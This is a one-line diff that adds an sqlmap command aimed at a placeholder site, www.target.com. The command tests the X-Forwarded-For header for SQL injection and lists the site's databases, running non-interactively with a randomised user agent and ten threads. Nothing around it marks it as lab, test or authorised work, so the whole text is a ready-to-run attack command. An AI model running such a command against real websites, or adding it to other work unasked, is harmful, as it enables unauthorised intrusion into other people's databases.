@@ -1,0 +1,1 @@
+sqlmap -u "https://www.target.com/" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10
